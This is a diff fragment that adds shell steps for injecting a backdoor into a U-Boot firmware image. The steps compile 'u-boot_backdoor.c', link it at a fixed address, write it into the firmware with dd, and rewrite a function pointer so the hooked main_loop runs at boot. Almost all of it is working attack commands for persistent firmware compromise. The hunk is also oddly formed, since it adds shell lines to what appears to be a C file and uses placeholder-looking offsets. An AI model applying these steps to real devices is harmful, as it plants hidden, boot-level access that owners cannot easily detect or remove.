@@ -39,3 +39,27 @@ void main_loop_hooked(void) {
     // Continue normal boot
     main_loop_original();
 }
+
+# Compile backdoor
+arm-none-eabi-gcc -c -mcpu=cortex-a9 u-boot_backdoor.c -o backdoor.o
+
+# Locate injection point in original firmware
+objdump -d original_firmware.bin | grep "main_loop"
+
+# Patch firmware with custom linker script
+cat > inject.ld <<EOF
+SECTIONS {
+    .backdoor 0x80040000 : {
+        backdoor.o(.text)
+    }
+}
+EOF
+
+arm-none-eabi-ld -T inject.ld backdoor.o -o backdoor.elf
+arm-none-eabi-objcopy -O binary backdoor.elf backdoor.bin
+
+# Manually patch firmware (replace NOP region or extend)
+dd if=backdoor.bin of=original_firmware.bin bs=1 seek=$((0x40000)) conv=notrunc
+
+# Update function pointer at main_loop call site
+printf '\x00\x40\x00\x80' | dd of=original_firmware.bin bs=1 seek=$((0x1234)) conv=notrunc
